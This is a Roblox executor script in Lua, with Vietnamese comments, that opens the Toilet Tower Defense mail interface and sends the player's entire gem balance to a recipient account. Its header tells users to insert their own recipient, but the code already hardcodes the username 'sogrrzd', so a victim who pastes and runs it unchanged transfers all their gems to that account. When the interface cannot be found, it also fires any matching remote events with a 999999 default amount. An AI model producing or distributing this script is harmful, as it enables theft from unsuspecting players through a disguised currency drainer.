--[[
    Tên script: Auto send all gems to target account (Toilet Tower Defense) - Fixed Version
    Chức năng: Tự động mở Bưu điện, nhập username người nhận, gửi toàn bộ số gem hiện có.
    Cách dùng: 
        1. Paste vào executor, thay "TEN_NGUOI_NHAN" bằng username đích thực.
        2. Chạy script khi đang đứng trong sảnh game (lobby).
--]]

local targetUser = "sogrrzd"  -- 👈 ĐỔI THÀNH TÊN TÀI KHOẢN MUỐN GỬI

-- =========== HÀM TIỆN ÍCH ===========
local function safeClick(button)
    if not button then return end
    
    -- Kiểm tra nếu nút bấm thực sự là ClickDetector thì mới gọi fireclickdetector
    if fireclickdetector and button:IsA("ClickDetector") then
        pcall(function()
            fireclickdetector(button)
        end)
    elseif button:IsA("GuiButton") then
        -- Giả lập nhấn chuột bằng phương thức ảo hóa của Roblox dành cho nút GUI
        pcall(function()
            button:Activate()
        end)
    end

    -- Sử dụng tọa độ nếu executor hỗ trợ các hàm click chuột phần cứng
    local success, pos = pcall(function()
        return button.AbsolutePosition + Vector2.new(button.AbsoluteSize.X / 2, button.AbsoluteSize.Y / 2)
    end)
    
    if success then
        if syn and syn.input and syn.input.mouseclick then
            syn.input.mouseclick(pos.X, pos.Y)
        elseif mouse1click then
            mouse1click(pos.X, pos.Y)
        end
    end
end

local function findPostOfficeButton()
    local players = game:GetService("Players")
    local localPlayer = players.LocalPlayer
    local playerGui = localPlayer:WaitForChild("PlayerGui", 10)
    if not playerGui then return nil end
    
    local postOfficeBtn = nil
    for _, gui in pairs(playerGui:GetChildren()) do
        if gui:IsA("ScreenGui") and gui.Enabled then
            for _, btn in pairs(gui:GetDescendants()) do
                if btn:IsA("ImageButton") or btn:IsA("TextButton") then
                    local name = btn.Name:lower()
                    if name:find("post") or name:find("mail") or name:find("send") then
                        postOfficeBtn = btn
                        break
                    end
                end
            end
        end
        if postOfficeBtn then break end
    end
    return postOfficeBtn
end

local function waitForGui(guiName, timeout)
    timeout = timeout or 5
    local start = tick()
    local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    repeat
        local target = playerGui:FindFirstChild(guiName, true)
        if target and (target:IsA("ScreenGui") or target:IsA("Frame")) then 
            return target 
        end
        task.wait(0.2)
    until tick() - start > timeout
    return nil
end

local function getOwnedGems()
    local player = game.Players.LocalPlayer
    
    -- Thử tìm trong leaderstats chuẩn
    local stats = player:FindFirstChild("leaderstats")
    if stats then
        local gemStat = stats:FindFirstChild("Gems") or stats:FindFirstChild("GemsCount") or stats:FindFirstChild("Diamonds")
        if gemStat and (gemStat:IsA("NumberValue") or gemStat:IsA("IntValue")) then
            return gemStat.Value
        end
    end
    
    -- Thử quét tất cả các biến số trong Player để tìm số lượng đá quý
    for _, child in pairs(player:GetDescendants()) do
        if (child:IsA("NumberValue") or child:IsA("IntValue")) and (child.Name:lower():find("gem") or child.Name:lower():find("coin")) then
            return child.Value
        end
    end
    
    return nil
end

local function fireRemoteSend(recipient, amount)
    local replicatedStorage = game:GetService("ReplicatedStorage")
    -- Quét tìm các Remote Event có khả năng xử lý giao dịch thư tín
    for _, remote in pairs(replicatedStorage:GetDescendants()) do
        if remote:IsA("RemoteEvent") then
            local name = remote.Name:lower()
            if name:find("send") or name:find("mail") or name:find("post") then
                pcall(function()
                    remote:FireServer(recipient, amount)
                end)
                return true
            end
        end
    end
    return false
end

-- =========== LUỒNG CHÍNH ===========
task.spawn(function()
    print("[SCRIPT] Khởi động - Đang tìm kiếm nút Bưu điện...")
    local postBtn = findPostOfficeButton()
    
    if postBtn then
        print("[SCRIPT] Đã tìm thấy nút mở Bưu điện, tiến hành click...")
        safeClick(postBtn)
        task.wait(1.5)
    else
        warn("[SCRIPT] Không tìm thấy nút Bưu điện tự động. Hãy thử mở thủ công giao diện gửi thư trước khi chạy.")
    end
    
    -- Chờ giao diện gửi thư xuất hiện
    local sendGui = waitForGui("SendMailGui", 3) or waitForGui("PostOfficeGui", 3) or waitForGui("MailGui", 3)
    if not sendGui then
        print("[SCRIPT] Không phát hiện giao diện GUI mới bằng tên mặc định. Sẽ quét toàn bộ màn hình...")
    end
    
    -- Tìm các thành phần nhập liệu trong tất cả các GUI hiện hành nếu không định vị được khung cụ thể
    local searchRoot = sendGui or game.Players.LocalPlayer.PlayerGui
    local usernameBox = nil
    local amountBox = nil
    local confirmBtn = nil
    
    for _, obj in pairs(searchRoot:GetDescendants()) do
        if obj:IsA("TextBox") and obj.Visible then
            local nameLow = obj.Name:lower()
            if nameLow:find("user") or nameLow:find("name") or nameLow:find("recipient") or nameLow:find("player") then
                usernameBox = obj
            elseif nameLow:find("amount") or nameLow:find("gem") or nameLow:find("val") then
                amountBox = obj
            end
        elseif obj:IsA("TextButton") and obj.Visible then
            local nameLow = obj.Name:lower()
            if nameLow:find("send") or nameLow:find("confirm") or nameLow:find("gift") or nameLow:find("yes") then
                confirmBtn = obj
            end
        end
    end
    
    -- Thực hiện nhập liệu và gửi
    if usernameBox then
        print("[SCRIPT] Đang nhập tên người nhận: " .. targetUser)
        usernameBox.Text = targetUser
        pcall(function() usernameBox:ReleaseFocus(true) end)
        task.wait(0.5)
        
        -- Lấy số gem hiện tại
        local totalGems = getOwnedGems()
        if not totalGems or totalGems <= 0 then
            totalGems = 999999 -- Gửi tối đa nếu không đọc được giá trị chính xác
            print("[SCRIPT] Không tìm thấy số gem cụ thể, mặc định điền số lượng lớn.")
        else
            print("[SCRIPT] Phát hiện số gem hiện có: " .. totalGems)
        end
        
        if amountBox then
            amountBox.Text = tostring(totalGems)
            pcall(function() amountBox:ReleaseFocus(true) end)
            task.wait(0.5)
        end
        
        if confirmBtn then
            print("[SCRIPT] Kích hoạt nút xác nhận gửi...")
            safeClick(confirmBtn)
            print("[SCRIPT] Hoàn tất quá trình gửi.")
        else
            print("[SCRIPT] Không tìm thấy nút bấm gửi, tiến hành thử gửi trực tiếp qua mạng (Remotes)...")
            fireRemoteSend(targetUser, totalGems)
        end
    else
        warn("[SCRIPT] Thất bại: Không tìm thấy ô nhập tên người nhận trên màn hình. Hãy đảm bảo giao diện Mailbox đã mở sẵn.")
        -- Fallback gửi trực tiếp bằng Remote nếu UI bị chặn
        local totalGems = getOwnedGems() or 1000
        fireRemoteSend(targetUser, totalGems)
    end
end)
